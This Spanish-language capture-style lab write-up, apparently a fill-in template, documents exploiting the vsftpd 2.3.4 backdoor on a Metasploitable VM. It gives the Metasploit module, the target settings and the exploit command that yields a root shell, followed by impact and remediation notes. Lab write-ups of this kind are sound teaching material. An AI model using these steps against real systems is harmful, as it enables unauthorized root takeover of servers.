# Writeup — Explotación del backdoor de vsftpd 2.3.4 (Metasploitable)

> Ejercicio de laboratorio sobre una máquina deliberadamente vulnerable (Metasploitable). Demuestra el proceso de identificar y explotar un servicio vulnerable con Metasploit.

## Objetivo y alcance
Comprometer una máquina de laboratorio (Metasploitable, 192.168.56.101) a través de un servicio FTP vulnerable, documentando el proceso completo. Entorno aislado, sin impacto en sistemas reales.

## Herramientas
- Kali Linux (atacante, 192.168.56.102)
- Metasploit Framework

## Vulnerabilidad
El servicio **vsftpd 2.3.4** contiene un **backdoor malicioso** (CVE-2011-2523) introducido en su código fuente: abre un shell con privilegios de **root** sin autenticación. Crítica, porque da control remoto total.

## Metodología
1. Identificación del servicio: el banner FTP revela la versión vulnerable (`220 vsftpd 2.3.4`).
2. Módulo en Metasploit: `exploit/unix/ftp/vsftpd_234_backdoor`.
3. Configuración: `set RHOSTS 192.168.56.101` y `set LHOST 192.168.56.102`.
4. Lanzamiento: `exploit`.
5. El framework confirma el banner vulnerable, lanza el backdoor y abre la sesión.

## Resultado
Sesión obtenida con privilegios de **root** (`getuid` → `Server username: root`): compromiso total del sistema.

*(aquí pega tu captura de la sesión como root)*

## Impacto
- **Severidad: Crítica.**
- Acceso remoto como root sin autenticación → control total (datos, pivoting, persistencia).
- CVSS v3.1: **9.8 (Critical)** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`  *[revísalo tú y confírmalo]*

## Remediación
- Actualizar vsftpd a una versión no afectada (el backdoor se retiró del código oficial al poco de descubrirse).
- No exponer FTP a redes no confiables; usar alternativas cifradas (SFTP/FTPS).
- Segmentación de red y monitorización de conexiones salientes anómalas.
